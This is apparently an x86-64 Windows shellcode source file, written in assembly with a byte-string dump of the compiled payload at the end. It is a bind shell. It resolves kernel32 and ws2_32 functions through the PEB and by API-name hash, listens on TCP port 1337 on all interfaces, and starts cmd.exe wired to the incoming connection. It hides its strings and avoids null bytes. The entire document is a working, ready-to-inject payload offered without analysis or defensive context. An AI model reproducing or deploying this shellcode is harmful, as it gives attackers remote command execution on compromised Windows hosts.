global _start

_start:
    push rsp                        ; stack
    pop rbp                         ; new stack frame
    sub rsp, 0x20                   ; space for variables

    .find_kernel32:
        xor rcx, rcx                ; TEB structure
        mov rsi, gs:[rcx + 0x60]    ; PEB structure
        mov rsi, [rsi + 0x18]       ; ntdll!PebLdr
        mov rsi, [rsi + 0x20]       ; InMemoryOrderModuleList
        mov rsi, [rsi]              ; ntdll.dll
        lodsq                       ; kernel32.dll
        mov rbx, [rax + 0x20]       ; kernel32 base

        jmp .find_short             ; short jump

    .find_ret:
        pop rsi                     ; $rsi = return addr
        mov [rbp - 0x8], rsi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        mov eax, [rbx + 0x3c]       ; RVA to PE signature
        add rax, rbx                ; PE signature
        xor rcx, rcx                ; $rcx = 0x0
        mov cl, 0x88                ; Offset to Export Table
        mov r10d, [rax + rcx]       ; RVA of Export Table
        add r10, rbx                ; Export table
        mov ecx, [r10 + 0x18]       ; NR of Names
        mov edi, [r10 + 0x20]       ; RVA of Name Pointer Table
        add rdi, rbx                ; Name Pointer Table

    .find_loop:
        jrcxz .find_end             ; if rcx == 0
        dec ecx                     ; counter -= 1
        xor rsi, rsi                ; $rsi = 0x0
        push rsi                    ; 0x0
        pop rax                     ; $rax = 0x0
        cdq                         ; $rdx = 0x0
        mov esi, [rdi + rcx * 4]    ; RVA of Symbol Name
        add rsi, rbx                ; Symbol Name

    .compute_hash:
        lodsb                       ; load in al next byte from rsi
        test al, al                 ; check null terminator
        jz .compare_hash            ; if ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

    .compare_hash:
        cmp edx, r13d               ; cmp edx, hash
        jnz .find_loop              ; if ZF != 1
        mov r11d, [r10 + 0x24]      ; RVA of Ordinal Table
        add r11, rbx                ; Ordinal Table
        mov cx, [r11 + 2 * rcx]     ; extrapolate ordinal functions
        mov r12d, [r10 + 0x1c]      ; RVA of Address Table
        add r12, rbx                ; Address Table
        mov eax, [r12 + 4 * rcx]    ; RVA of function
        add rax, rbx                ; function

    .find_end:
        ret                         ; return

    .symbol_kernel32:
        mov r13d, 0x8ee05933        ; TerminateProcess() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x10], rax       ; var16 = TerminateProcess()

        mov r13d, 0xa9f72dc9        ; CreateProcessA() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x18], rax       ; var32 = CreateProcessA()

        mov r13d, 0x583c436c        ; LoadLibraryA() hash
        call [rbp - 0x8]            ; call .find_function

    .load_ws2_32:
        xor rdx, rdx                ; $rdx = 0x0
        mov dx, 0x6c6c              ; "ll"
        push rdx                    ; "ll\x00"
        mov rdx, 0x642e32335f327377 ; "ws2_32.d"
        push rdx                    ; "ws2_32.dll\x00"
        push rsp                    ; &"ws2_32.dll"
        pop rcx                     ; lpLibFileName
        sub rsp, 0x20               ; space for call
        call rax                    ; call LoadLibraryA()

    .symbol_ws2_32:
        push rax                    ; ws2_32
        pop rbx                     ; $rbx = ws2_32 base

        mov r13d, 0xe0a06fc5        ; WSASocketA() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x20], rax       ; var48 = WSASocketA()

        mov r13d, 0x3ec0208         ; bind() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x28], rax       ; var56 = bind()

        mov r13d, 0x11e208ce        ; listen() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x30], rax       ; var64 = listen()

        mov r13d, 0x10180838        ; accept() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x38], rax       ; var72 = accept()

        mov r13d, 0xe17a7010        ; WSAStartup() hash
        call [rbp - 0x8]            ; call .find_function

    .call_wsastartup:
        xor rcx, rcx                ; $rcx = 0x0
        mov cx, 0x198               ; $rcx = 0x198
        sub rsp, rcx                ; sub cx to avoid overwriting
        push rsp                    ; space
        pop rdx                     ; lpWSAData
        mov cx, 0x0202              ; wVersionRequired
        call rax                    ; call WSAStartup()

    .call_wsasocketa:
        push 0x2                    ; 0x2
        pop rcx                     ; af
        push 0x1                    ; 0x1
        pop rdx                     ; type
        push 0x6                    ; 0x6
        pop r8                      ; protocol
        xor r9, r9                  ; lpProtocolInfo
        mov [rsp + 0x20], r9        ; g
        mov [rsp + 0x28], r9        ; dwFlags
        call [rbp - 0x20]           ; call WSASocketA()
        push rax                    ; descriptor
        pop rdi                     ; $rsi = descriptor

    .call_bind:
        push 0x2                    ; 0x2
        pop rdx                     ; sin_family
        mov [rsp], rdx              ; sockaddr_in
        mov dx, 0x3905              ; 1337
        mov [rsp + 0x2], rdx        ; sin_port
        cdq                         ; "0.0.0.0"
        mov [rsp + 0x4], rdx        ; sin_addr

        push rdi                    ; descriptor
        pop rcx                     ; s
        push rsp                    ; &name
        pop rdx                     ; name
        push 0x16                   ; 0x16
        pop r8                      ; namelen
        call [rbp - 0x28]           ; call bind()

    .call_listen:
        push rdi                    ; descriptor
        pop rcx                     ; s
        cdq                         ; backlog
        call [rbp - 0x30]           ; call listen()

    .call_accept:
        push rdi                    ; descriptor
        pop rcx                     ; s
        cdq                         ; name
        xor r8, r8                  ; namelen
        call [rbp - 0x38]           ; call accept()
        push rax                    ; descriptor
        pop rdi                     ; $rdi = descriptor

    .create_startupinfoa:
        push rdi                    ; hStdError
        push rdi                    ; hStdOutput
        push rdi                    ; hStdInput
        cdq                         ; $rdx = 0x0
        push dx                     ; lpReserved2
        push rdx                    ; cbReserved2
        push rdx                    ; wShowWindow
        inc dh                      ; $rdx = 0x100
        push dx                     ; dwFlags
        dec dh                      ; $rdx = 0x0
        push dx                     ; dwFillAttribute
        push dx                     ; dwFillAttribute
        push rdx                    ; dwYCountChars & dwXCountChars
        push rdx                    ; dwYSize & dwXSize
        push rdx                    ; dwY & dwX
        push rdx                    ; lpTitle
        push rdx                    ; lpDesktop
        push rdx                    ; lpReserved
        mov dl, 0x68                ; $rdx = 0x68
        push rdx                    ; cb
        push rsp                    ; structure
        pop rdi                     ; $rdi = startupinfoa

    .create_string:
        mov rax, 0xff9a879ad19b929d ; $rax = neg "cmd.exe\x00"
        neg rax                     ; $rax = "cmd.exe\x00"
        push rax                    ; "cmd.exe"
        push rsp                    ; &"cmd.exe"
        pop rdx                     ; lpCommandLine

    .call_createprocessa:
        push rsp                    ; stack
        pop rax                     ; $rax = $rsp
        sub rax, 0x20               ; space for structure
        push rax                    ; lpProcessInformation
        push rdi                    ; lpStartupInfo
        xor rcx, rcx                ; lpApplicationName
        push rcx                    ; lpCurrentDirectory
        push rcx                    ; lpEnvironment
        push rcx                    ; dwCreationFlags
        inc cl                      ; $rcx = 0x1
        push rcx                    ; bInheritHandles
        dec cl                      ; $rcx = 0x0
        push rcx                    ; space for lpThreadAttributes
        push rcx                    ; space for lpProcessAttributes
        push rcx                    ; space for lpCommandLine
        push rcx                    ; space for lpApplicationName
        xor r8, r8                  ; lpProcessAttributes
        xor r9, r9                  ; lpThreadAttributes
        call [rbp - 0x18]           ; call CreateProcessA()

    .exit:
        push 0xffffffffffffffff     ; -1
        pop rcx                     ; hProcess
        cdq                         ; uExitCode
        call [rbp - 0x10]           ; call TerminateProcess()

; shellcode = b"\x54\x5d\x48\x83\xec\x20\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x20\x48\x8b\x36\x48\xad\x48\x8b\x58\x20\xeb\x07\x5e\x48\x89\x75\xf8\xeb\x5e\xe8\xf4\xff\xff\xff\x8b\x43\x3c\x48\x01\xd8\x48\x31\xc9\xb1\x88\x44\x8b\x14\x08\x49\x01\xda\x41\x8b\x4a\x18\x41\x8b\x7a\x20\x48\x01\xdf\xe3\x39\xff\xc9\x48\x31\xf6\x56\x58\x99\x8b\x34\x8f\x48\x01\xde\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x44\x39\xea\x75\xdf\x45\x8b\x5a\x24\x49\x01\xdb\x66\x41\x8b\x0c\x4b\x45\x8b\x62\x1c\x49\x01\xdc\x41\x8b\x04\x8c\x48\x01\xd8\xc3\x41\xbd\x33\x59\xe0\x8e\xff\x55\xf8\x48\x89\x45\xf0\x41\xbd\xc9\x2d\xf7\xa9\xff\x55\xf8\x48\x89\x45\xe8\x41\xbd\x6c\x43\x3c\x58\xff\x55\xf8\x48\x31\xd2\x66\xba\x6c\x6c\x52\x48\xba\x77\x73\x32\x5f\x33\x32\x2e\x64\x52\x54\x59\x48\x83\xec\x20\xff\xd0\x50\x5b\x41\xbd\xc5\x6f\xa0\xe0\xff\x55\xf8\x48\x89\x45\xe0\x41\xbd\x08\x02\xec\x03\xff\x55\xf8\x48\x89\x45\xd8\x41\xbd\xce\x08\xe2\x11\xff\x55\xf8\x48\x89\x45\xd0\x41\xbd\x38\x08\x18\x10\xff\x55\xf8\x48\x89\x45\xc8\x41\xbd\x10\x70\x7a\xe1\xff\x55\xf8\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x54\x5a\x66\xb9\x02\x02\xff\xd0\x6a\x02\x59\x6a\x01\x5a\x6a\x06\x41\x58\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\x55\xe0\x50\x5f\x6a\x02\x5a\x48\x89\x14\x24\x66\xba\x05\x39\x48\x89\x54\x24\x02\x99\x48\x89\x54\x24\x04\x57\x59\x54\x5a\x6a\x16\x41\x58\xff\x55\xd8\x57\x59\x99\xff\x55\xd0\x57\x59\x99\x4d\x31\xc0\xff\x55\xc8\x50\x5f\x57\x57\x57\x99\x66\x52\x52\x52\xfe\xc6\x66\x52\xfe\xce\x66\x52\x66\x52\x52\x52\x52\x52\x52\x52\xb2\x68\x52\x54\x5f\x48\xb8\x9d\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd8\x50\x54\x5a\x54\x58\x48\x83\xe8\x20\x50\x57\x48\x31\xc9\x51\x51\x51\xfe\xc1\x51\xfe\xc9\x51\x51\x51\x51\x4d\x31\xc0\x4d\x31\xc9\xff\x55\xe8\x6a\xff\x59\x99\xff\x55\xf0"
